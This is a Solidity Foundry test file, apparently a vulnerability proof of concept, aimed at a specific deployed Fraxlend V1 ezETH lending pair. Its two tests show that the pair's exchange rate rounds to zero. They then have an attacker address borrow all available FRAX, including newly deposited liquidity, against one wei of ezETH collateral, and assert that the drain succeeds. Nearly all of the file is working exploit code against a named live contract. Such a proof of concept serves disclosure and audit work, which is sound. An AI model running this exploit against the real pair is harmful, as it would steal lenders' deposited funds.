// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFraxlendV1Like {
    function name() external view returns (string memory);
    function asset() external view returns (address);
    function collateralContract() external view returns (address);
    function oracleDivide() external view returns (address);
    function oracleNormalization() external view returns (uint256);
    function exchangeRateInfo() external view returns (uint32 lastTimestamp, uint224 exchangeRate);
    function totalAsset() external view returns (uint128 amount, uint128 shares);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function updateExchangeRate() external returns (uint256 exchangeRate);
    function borrowAsset(uint256 _borrowAmount, uint256 _collateralAmount, address _receiver)
        external
        returns (uint256 _shares);
    function userBorrowShares(address) external view returns (uint256);
    function userCollateralBalance(address) external view returns (uint256);
    function isSolvent(address _borrower) external view returns (bool);
}

interface AggregatorV3Like {
    function description() external view returns (string memory);
    function decimals() external view returns (uint8);
    function latestRoundData() external view returns (
        uint80,
        int256,
        uint256,
        uint256,
        uint80
    );
}

contract V1EzEthZeroExchangeRateDrainPoC is Test {
    address constant PAIR = 0xF1b3Cbc51a7483C656af9Aa09F319a3b66aD5e04;
    address constant EZETH = 0xaf620E6913Fc52AcF7C5a5e08Bd4Cb8aa64Be211;

    address attacker = address(0xA77A);

    function _logOracleState(IFraxlendV1Like pair) internal {
        address oracleDivide = pair.oracleDivide();

        (, int256 answer,, uint256 updatedAt,) = AggregatorV3Like(oracleDivide).latestRoundData();
        (uint32 lastTsBefore, uint224 storedRateBefore) = pair.exchangeRateInfo();

        emit log_string(pair.name());
        emit log_named_address("oracleDivide", oracleDivide);
        emit log_string(AggregatorV3Like(oracleDivide).description());
        emit log_named_uint("oracleDecimals", AggregatorV3Like(oracleDivide).decimals());
        emit log_named_int("oracleAnswer", answer);
        emit log_named_uint("oracleUpdatedAt", updatedAt);
        emit log_named_uint("oracleNormalization", pair.oracleNormalization());
        emit log_named_uint("storedLastTimestampBefore", lastTsBefore);
        emit log_named_uint("storedExchangeRateBefore", storedRateBefore);
    }

    function _availableAsset(IFraxlendV1Like pair) internal view returns (uint256 available) {
        (uint128 totalAssetAmount, ) = pair.totalAsset();
        (uint128 totalBorrowAmount, ) = pair.totalBorrow();
        available = uint256(totalAssetAmount) - uint256(totalBorrowAmount);
    }

    function _borrowWithDust(IFraxlendV1Like pair, uint256 borrowAmount) internal returns (uint256 gained, uint256 spent) {
        address asset = pair.asset();

        deal(EZETH, attacker, 1);

        uint256 fraxBefore = IERC20Like(asset).balanceOf(attacker);
        uint256 ezEthBefore = IERC20Like(EZETH).balanceOf(attacker);

        vm.startPrank(attacker);
        IERC20Like(EZETH).approve(PAIR, 1);
        pair.borrowAsset({
            _borrowAmount: borrowAmount,
            _collateralAmount: 1,
            _receiver: attacker
        });
        vm.stopPrank();

        gained = IERC20Like(asset).balanceOf(attacker) - fraxBefore;
        spent = ezEthBefore - IERC20Like(EZETH).balanceOf(attacker);
    }

    function test_POC_EzEthPairZeroExchangeRateAllowsDustCollateralBorrow() public {
        IFraxlendV1Like pair = IFraxlendV1Like(PAIR);

        emit log_named_address("asset", pair.asset());
        emit log_named_address("collateral", pair.collateralContract());

        assertEq(pair.collateralContract(), EZETH, "unexpected collateral");

        _logOracleState(pair);

        uint256 returnedRate = pair.updateExchangeRate();
        (, uint224 storedRateAfter) = pair.exchangeRateInfo();

        emit log_named_uint("returnedExchangeRate", returnedRate);
        emit log_named_uint("storedExchangeRateAfter", storedRateAfter);

        assertEq(returnedRate, 0, "exchange rate should round to zero");
        assertEq(storedRateAfter, 0, "stored exchange rate should be zero");

        uint256 available = _availableAsset(pair);
        uint256 borrowAmount = available;
        if (borrowAmount > 1e18) borrowAmount = 1e18;

        emit log_named_uint("availableAsset", available);
        emit log_named_uint("borrowAmountAttempted", borrowAmount);

        require(borrowAmount > 0, "no available FRAX to borrow");

        (uint256 gained, uint256 spent) = _borrowWithDust(pair, borrowAmount);

        emit log_named_uint("attackerFraxGained", gained);
        emit log_named_uint("attackerEzEthSpent", spent);
        emit log_named_uint("attackerBorrowShares", pair.userBorrowShares(attacker));
        emit log_named_uint("attackerPairCollateral", pair.userCollateralBalance(attacker));

        // The borrow itself succeeding is the exploit proof:
        // V1 exchangeRate is zero, so the solvency modifier accepts dust collateral.
        assertEq(spent, 1, "attacker spent more than dust");
        assertEq(gained, borrowAmount, "attacker did not receive borrowed FRAX");
        assertGt(pair.userBorrowShares(attacker), 0, "borrow shares were not created");
        assertEq(pair.userCollateralBalance(attacker), 1, "pair did not record dust collateral");
    }
    function test_POC_AnyNewLiquidityCanBeBorrowedWithDustCollateral() public {
        IFraxlendV1Like pair = IFraxlendV1Like(PAIR);
        address asset = pair.asset();

        uint256 rate = pair.updateExchangeRate();
        assertEq(rate, 0, "exchange rate should be zero");

        address lender = address(0xBEEF);
        uint256 depositAmount = 10e18;

        deal(asset, lender, depositAmount);

        vm.startPrank(lender);
        IERC20Like(asset).approve(PAIR, depositAmount);
        // deposit(uint256,address) exists on the V1 pair through ERC4626-style lending.
        (bool ok, bytes memory ret) = PAIR.call(
            abi.encodeWithSignature("deposit(uint256,address)", depositAmount, lender)
        );
        require(ok, "deposit failed");
        vm.stopPrank();

        uint256 available = _availableAsset(pair);
        emit log_named_uint("availableAfterNewDeposit", available);

        deal(EZETH, attacker, 1);

        uint256 beforeFrax = IERC20Like(asset).balanceOf(attacker);

        vm.startPrank(attacker);
        IERC20Like(EZETH).approve(PAIR, 1);
        pair.borrowAsset({
            _borrowAmount: depositAmount,
            _collateralAmount: 1,
            _receiver: attacker
        });
        vm.stopPrank();

        uint256 gained = IERC20Like(asset).balanceOf(attacker) - beforeFrax;

        emit log_named_uint("newLiquidityDeposited", depositAmount);
        emit log_named_uint("attackerFraxGainedFromNewLiquidity", gained);
        emit log_named_uint("attackerEzEthCollateral", pair.userCollateralBalance(attacker));
        emit log_named_uint("attackerBorrowShares", pair.userBorrowShares(attacker));

        assertEq(gained, depositAmount, "attacker did not drain new liquidity");
        assertEq(pair.userCollateralBalance(attacker), 1, "not dust collateral");
    }

}
